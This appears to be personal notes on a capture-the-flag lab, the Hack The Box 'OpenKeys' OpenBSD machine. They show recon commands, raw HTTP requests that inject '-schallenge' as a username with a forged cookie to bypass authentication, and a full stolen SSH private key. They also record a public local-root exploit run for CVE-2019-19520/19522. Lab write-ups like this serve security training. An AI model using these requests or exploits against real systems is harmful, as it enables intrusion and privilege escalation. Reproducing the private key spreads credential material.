# Target

OpenBSD

CTF-CVE

10.10.10.199

# Recon

`nmap target`

`nmap -p- -T4 target`

`dirb http://target`

`sudo nmap -p 22,80 -sV -sC --script vuln target`

Found intersting swap file for a authentication program? - http://10.10.10.199/includes/auth.php.swp

Can run `vim -r auth.php.swp` to open

```
┌─[monty@parrot]─[~/ctfs/htb/boxes/openkeys/recon]─[Fri 01 Jan 2021 03:55:11 AM CST]
└──╼ $file auth.php.swp 
auth.php.swp: Vim swap file, version 8.1, pid 49850, user jennifer, host openkeys.htb, file /var/www/htdocs/includes/auth.php
```

possible username, jennifer

interesting snippet

```
  3 function authenticate($username, $password)
  4 {
  5     $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
  6     system($cmd, $retcode);
  7     return $retcode;
  8 }
```

another one, sets user with cookie
```
 42 function init_session()
 43 {
 44     $_SESSION["logged_in"] = True;
 45     $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
 46     $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
 47     $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
 48     $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
 49     $_SESSION["username"] = $_REQUEST['username'];
 50 }
```

Found http://10.10.10.199/auth_helpers/check_auth and downloaded it

Executable file

```
┌─[monty@parrot]─[~/ctfs/htb/boxes/openkeys/recon]─[Fri 01 Jan 2021 03:55:11 AM CST]
└──╼ $file check_auth 
check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
```

String in exe - `auth_userokay`

# Exploitation

authentication bypass - https://thehackernews.com/2019/12/openbsd-authentication-vulnerability.html

```
POST /index.php HTTP/1.1
Host: 10.10.10.199
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.10.10.199
DNT: 1
Connection: close
Referer: http://10.10.10.199/index.php
Cookie: PHPSESSID=gbq4vke50gu50subglkl1ple13
Upgrade-Insecure-Requests: 1

username=-schallenge&password=tmp
```

Stole Jennifer's SSH key
```
POST /index.php HTTP/1.1
Host: 10.10.10.199
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.10.10.199
DNT: 1
Connection: close
Referer: http://10.10.10.199/index.php
Cookie: username=jennifer
Upgrade-Insecure-Requests: 1

username=-schallenge&password=tmp
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Got user

```
openkeys$ wc -c user.txt                                                                           
      33 user.txt
openkeys$ hostname;pwd;id
openkeys.htb
/home/jennifer
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
```

# Privilege Escalation

.cshrc file with this as the path, same as PATH in bash? I can control ~/bin

`set path = (~/bin /bin /sbin /usr/{bin,sbin,X11R6/bin,local/bin,local/sbin,games})`

Sticky bit, wheel group, root owned
```
openkeys$ ls -lh /usr/local/bin/check\_auth
-rwsr-sr-x  1 root  wheel  12.0K Jan 13  2020 /usr/local/bin/check\_auth
openkeys$ id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
```

Local privesc, need jennifer's password for CVE-2019-19519 - https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/

Trying https://raw.githubusercontent.com/secf00tprint/local-exploits/master/CVE-2019-19520/openbsd-authroot at Fri 01 Jan 2021 06:01:54 AM CST

Exploit failed, resetting box and trying again. Believed to fail because it had already been done and had not been reset

Completed at Fri 01 Jan 2021 06:11:11 AM CST
```
openkeys$ chmod +x openbsd-authroot 
openkeys$ ./openbsd-authroot                                                                       
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
openkeys# id;hostname                                                                           
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys.htb
```
